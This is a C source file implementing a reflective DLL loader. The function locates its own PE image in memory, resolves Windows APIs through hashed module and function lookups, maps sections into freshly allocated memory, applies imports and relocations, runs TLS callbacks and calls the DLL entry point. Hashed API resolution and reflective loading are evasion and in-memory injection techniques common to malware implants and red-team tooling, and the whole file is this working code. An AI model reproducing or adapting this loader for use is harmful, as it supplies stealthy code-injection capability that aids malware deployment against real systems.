#include "Utils.h"

extern __declspec(dllexport) BOOLEAN ReflectiveLoader()
{

	//------------------------------------------------------

	PIMAGE_TLS_DIRECTORY TlsDir							= NULL;
	PIMAGE_TLS_CALLBACK* TlsCallback					= NULL;
	fnDllMain			 DllMain						= NULL;
	PVOID				 ReflectiveLoaderBaseAddress	= NULL;
	PVOID				 ImageBase						= NULL;
	PVOID				 EntryPoint						= NULL;
	DWORD_PTR			 Delta							= 0;
	DWORD				 RelocRVA						= 0;
	DWORD				 TlsRva							= 0;
	ULONG_PTR			 CurrentAddress					= 0;
	ULONG_PTR			 HeaderValue					= 0;
	REF_LDR				 ReflectiveLoaderApi			= { 0 };

	//------------------------------------------------------

	CurrentAddress = U_PTR(ReflectiveLoader);

	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)CurrentAddress)->e_magic == IMAGE_DOS_SIGNATURE)
		{
			HeaderValue = ((PIMAGE_DOS_HEADER)CurrentAddress)->e_lfanew;
			if (HeaderValue >= sizeof(IMAGE_DOS_HEADER) && HeaderValue < 1024)
			{
				HeaderValue += CurrentAddress;
				if (((PIMAGE_NT_HEADERS)HeaderValue)->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}
		CurrentAddress--;
	}

	ReflectiveLoaderBaseAddress = (PVOID)CurrentAddress;

	//------------------------------------------------------

	ReflectiveLoaderApi.PeHeaders.pImgNtHdrs				= (PIMAGE_NT_HEADERS64)(U_PTR(ReflectiveLoaderBaseAddress) + ((PIMAGE_DOS_HEADER)ReflectiveLoaderBaseAddress)->e_lfanew);

	ReflectiveLoaderApi.PeHeaders.pImgSecHdr				= IMAGE_FIRST_SECTION(ReflectiveLoaderApi.PeHeaders.pImgNtHdrs);
	ReflectiveLoaderApi.PeHeaders.pEntryImportDataDir		= &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	ReflectiveLoaderApi.PeHeaders.pEntryExportDataDir		= &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	ReflectiveLoaderApi.PeHeaders.pEntryBaseRelocDataDir	= &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	ReflectiveLoaderApi.PeHeaders.pEntryExceptionDataDir	= &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	ReflectiveLoaderApi.PeHeaders.pEntryTLSDataDir			= &ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	//------------------------------------------------------

	ReflectiveLoaderApi.DllModule.Kernel32					= GetHashedModuleHandle(kernel32_dll_HASH);
	ReflectiveLoaderApi.DllModule.Ntdll						= GetHashedModuleHandle(ntdll_dll_HASH);

	ReflectiveLoaderApi.Api.pVirtualAlloc					= ResolveHashedFunctionEx(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Kernel32, VirtualAlloc_HASH,				0);
	ReflectiveLoaderApi.Api.pVirtualProtect					= ResolveHashedFunctionEx(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Kernel32, VirtualProtect_HASH,			0);
	ReflectiveLoaderApi.Api.pLoadLibraryA					= ResolveHashedFunctionEx(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Kernel32, LoadLibraryA_HASH,				0);
	ReflectiveLoaderApi.Api.pNtFlushInstructionCache		= ResolveHashedFunctionEx(&ReflectiveLoaderApi, ReflectiveLoaderApi.DllModule.Ntdll,	NtFlushInstructionCache_HASH,	0);

	//------------------------------------------------------

	if (!(ImageBase = ReflectiveLoaderApi.Api.pVirtualAlloc(NULL, ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.SizeOfImage, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || ImageBase == NULL)
		return FALSE;

	//------------------------------------------------------

	for (DWORD i = 0; i < ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->FileHeader.NumberOfSections; i++)
	{

		if (ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].SizeOfRawData == 0)
			continue;

		MEMCPY
		(
			(PUCHAR)(U_PTR(ImageBase) + ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].VirtualAddress),
			(PUCHAR)(U_PTR(ReflectiveLoaderBaseAddress) + ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].PointerToRawData),
			ReflectiveLoaderApi.PeHeaders.pImgSecHdr[i].SizeOfRawData
		);

	}

	//------------------------------------------------------

	Delta		= (U_PTR(ImageBase) - ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.ImageBase);
	RelocRVA	= ReflectiveLoaderApi.PeHeaders.pEntryBaseRelocDataDir->VirtualAddress;

	//------------------------------------------------------

	if (!ResolveImportAddressTable(ImageBase, &ReflectiveLoaderApi))
		return FALSE;

	if (!ProcessSectionRelocations(RelocRVA, ImageBase, Delta))
		return FALSE;

	if (!ChangeMemoryProtection(&ReflectiveLoaderApi, ImageBase))
		return FALSE;

	//------------------------------------------------------

	TlsRva = ReflectiveLoaderApi.PeHeaders.pEntryTLSDataDir->VirtualAddress;
	if (TlsRva != 0)
	{

		TlsDir = (PIMAGE_TLS_DIRECTORY)(U_PTR(ImageBase) + TlsRva);
		TlsCallback = (PIMAGE_TLS_CALLBACK*)TlsDir->AddressOfCallBacks;

		if (TlsCallback)
		{

			while (*TlsCallback != NULL)
			{

				(*TlsCallback)((LPVOID)ImageBase, DLL_PROCESS_ATTACH, NULL);
				TlsCallback++;

			}

		}

	}

	//------------------------------------------------------

	if (!NT_SUCCESS(ReflectiveLoaderApi.Api.pNtFlushInstructionCache(NtCurrentProcess(), NULL, 0)))
		return FALSE;

	EntryPoint = C_PTR((U_PTR(ImageBase) + ReflectiveLoaderApi.PeHeaders.pImgNtHdrs->OptionalHeader.AddressOfEntryPoint));
	if (!EntryPoint)
		return FALSE;

	DllMain = (fnDllMain)EntryPoint;
	DllMain((HINSTANCE)ImageBase, DLL_PROCESS_ATTACH, NULL);

	//------------------------------------------------------

	return ((DllMain != NULL)) ? TRUE : FALSE;

}